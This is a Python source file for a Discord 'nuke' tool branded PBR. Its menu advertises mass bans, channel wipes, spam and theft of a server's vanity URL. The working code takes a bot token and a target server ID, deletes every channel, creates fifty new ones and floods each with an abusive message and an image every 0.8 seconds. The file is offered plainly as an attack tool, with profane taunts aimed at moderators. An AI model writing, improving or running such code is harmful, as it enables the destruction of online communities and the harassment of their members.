import discord
from discord.ext import commands, tasks
import asyncio
import sys
import os
import time
from colorama import Fore, Style, init

init(autoreset=True)

RED = Fore.RED
WHITE = Fore.WHITE
RESET = Style.RESET_ALL

ASCII_BANNER = r"""
 ██▓███   ▄▄▄▄    ██▀███      ▓█████▄  ██▓  ██████  ▄████▄   ▒█████   ██▀███  ▓█████▄    ▄▄▄█████▓ ▒█████   ▒█████   ██▓   
▓██░  ██▒▓█████▄ ▓██ ▒ ██▒    ▒██▀ ██▌▓██▒▒██    ▒ ▒██▀ ▀█  ▒██▒  ██▒▓██ ▒ ██▒▒██▀ ██▌    ▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒   
▓██░ ██▓▒▒██▒ ▄██▓██ ░▄█ ▒    ░██   █▌▒██▒░ ▓██▄   ▒▓█    ▄ ▒██░  ██▒▓██ ░▄█ ▒░██   █▌    ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░   
▒██▄█▓▒ ▒▒██░█▀  ▒██▀▀█▄      ░▓█▄   ▌░██░  ▒   ██▒▒▓▓▄ ▄██▒▒██   ██░▒██▀▀█▄  ░▓█▄   ▌    ░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░   
▒██▒ ░  ░░▓█  ▀█▓░██▓ ▒██▒    ░▒████▓ ░██░▒██████▒▒▒ ▓███▀ ░░ ████▓▒░░██▓ ▒██▒░▒████▓      ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒
▒▓▒░ ░  ░░▒▓███▀▒░ ▒▓ ░▒▓░     ▒▒▓  ▒ ░▓  ▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░ ▒▒▓  ▒      ▒ ░░    ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░
░▒ ░     ▒░▒    ░   ░▒ ░ ▒░     ░ ▒  ▒  ▒ ░░ ░▒  ░ ░  ░  ▒      ░ ▒ ▒░   ░▒ ░ ▒░ ░ ▒  ▒        ░       ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░
░░       ░    ░   ░░   ░        ░ ░  ░  ▒ ░░  ░  ░  ░  ░         ░ ░ ░ ▒    ░░   ░  ░ ░  ░        ░       ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░  
           ░          ░           ░     ░        ░  ░ ░           ░ ░     ░        ░                    ░ ░      ░ ░      ░  ░
                ░               ░                                            ░                                                
"""

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def animated_banner():
    clear()
    for line in ASCII_BANNER.splitlines():
        print(f"{RED}{line}")
        time.sleep(0.05)

def print_menu():
    print(f"\n      {RED}┌──────────────────┐          ┌──────────┐          ┌──────────────────┐")
    print(f"      │      {RED}Nuke{RED}        │          │   {RED}Raid{RED}   │          │      {RED}ULTRA{RED}       │")
    print(f"      └──────────────────┘          └──────────┘          └──────────────────┘")
    
    menu = [
        (f"[{RED}01{RED}] Webhook Spammer  ", f"[{RED}11{RED}] Role Mass-Create", f"[{RED}21{RED}] Ban All Members   "),
        (f"[{RED}02{RED}] Channel Mass-Del ", f"[{RED}12{RED}] Role Mass-Delete", f"[{RED}22{RED}] Kick All Members  "),
        (f"[{RED}03{RED}] Emoji Mass-Delete", f"[{RED}13{RED}] Nickname Fuckup  ", f"[{RED}23{RED}] Admin Bypass Grant"),
        (f"[{RED}04{RED}] Server Renamer   ", f"[{RED}14{RED}] Category Nuke    ", f"[{RED}24{RED}] Prune Members     "),
        (f"[{RED}05{RED}] Icon Changer     ", f"[{RED}15{RED}] Mass-DM Members  ", f"[{RED}25{RED}] Vanity URL Stealer"),
        (f"[{RED}06{RED}] Webhook Deleter  ", f"[{RED}16{RED}] Bot-Invite Flood ", f"[{RED}26{RED}] FULL GUILD WIPE   "),
        (f"                      ", f"[{RED}17{RED}] Spam-Ghost Ping  ", f"                    ")
    ]

    for c1, c2, c3 in menu:
        print(f"      {RED}{c1}        {RED}{c2}        {RED}{c3}")

def get_input():
    animated_banner()
    print_menu()
    choice = input(f"\n{RED} (pbrfuck@pbrfuckservers)─[~/{RED}PBR-Discord-Tool/Menu-1{RED}] $ {WHITE}").strip()
    
    TOKEN = input(f"{RED}Enter Bot Token: {WHITE}").strip()
    
    use_app_id = input(f"{RED}Use Application ID? (y/n): {WHITE}").lower()
    APPLICATION_ID = None
    if use_app_id == 'y':
        APPLICATION_ID = input(f"{RED}Enter Application ID: {WHITE}").strip()

    GUILD_ID_INPUT = input(f"{RED}Enter Target Server ID: {WHITE}").strip()
    IMAGE_PATH = input(f"{RED}Enter Image Path: {WHITE}").strip().replace('"', '')

    custom_msg_choice = input(f"{RED}Custom nuke message? (y/n): {WHITE}").lower()
    if custom_msg_choice == 'y':
        NUKE_MESSAGE = input(f"{RED}Enter custom message: {WHITE}").strip()
    else:
        NUKE_MESSAGE = "DISCORD SERVER FUCKED BY PBR. WE SPREAD WE ARE HUMANS WE NUKE WE DESTROY WE MAKE MODS CRY"

    return choice, TOKEN, APPLICATION_ID, GUILD_ID_INPUT, IMAGE_PATH, NUKE_MESSAGE

choice, TOKEN, APPLICATION_ID, GUILD_ID_INPUT, IMAGE_PATH, NUKE_MESSAGE = get_input()

try:
    TARGET_GUILD_ID = int(GUILD_ID_INPUT)
except ValueError:
    sys.exit(f"{RED}Invalid ID format.")

intents = discord.Intents.all()
bot = commands.Bot(command_prefix=".", intents=intents)
target_channels = []

@tasks.loop(seconds=0.8)
async def aggressive_spam():
    if not target_channels: return
    for channel in target_channels:
        try:
            with open(IMAGE_PATH, "rb") as f:
                await channel.send(content=NUKE_MESSAGE, file=discord.File(f))
        except: continue

@bot.event
async def on_ready():
    print(f"\n{WHITE}[!] Bot Online: {RED}{bot.user.name}")
    print(f"{WHITE}[!] Target ID: {RED}{TARGET_GUILD_ID}")
    print(f"{WHITE}[!] Running Option: {RED}{choice}")

@bot.command()
async def execute(ctx):
    if ctx.guild.id != TARGET_GUILD_ID: return
    print(f"{RED}[!!!] INITIATING AGGRESSIVE SEQUENCE [!!!]")
    
    tasks_to_run = [ch.delete() for ch in ctx.guild.channels]
    await asyncio.gather(*tasks_to_run, return_exceptions=True)

    create_tasks = [ctx.guild.create_text_channel(name="pbr-nuked") for _ in range(50)]
    new_channels = await asyncio.gather(*create_tasks, return_exceptions=True)
    
    for ch in new_channels:
        if isinstance(ch, discord.TextChannel):
            target_channels.append(ch)

    if not aggressive_spam.is_running():
        aggressive_spam.start()

try:
    bot.run(TOKEN)
except Exception as e:
    print(f"{RED}System Error: {e}")